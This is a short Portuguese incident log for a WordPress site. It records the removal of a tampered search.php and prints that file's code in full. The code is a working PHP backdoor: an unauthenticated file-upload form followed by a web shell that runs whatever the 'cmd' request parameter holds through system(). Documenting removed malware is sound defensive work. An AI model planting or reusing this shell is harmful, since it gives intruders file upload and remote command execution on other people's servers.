---
id: doc2
title: Registro de arquivos maliciosos Site Wordpress [2]
sidebar_label: COD 2018-04-11:02
---

## 2.0.0 - 2018-07-10

### Fixed

- Removido arquivo search.php com código fonte modificado

## Código

```php

<?php
$files = @$_FILES['files'];
if ($files['name'] != '') {
$fullpath = $_REQUEST['path'] . $files['name'];
if (move_uploaded_file($files['tmp_name'], $fullpath)) {
echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
}
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype=multipart/form-data action=><input type=text name=path><input type=file name=files><input type=submit value=Up></form></body></html>';
?><?php $cmd = <<<EOD
cmd
EOD;
if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>

```
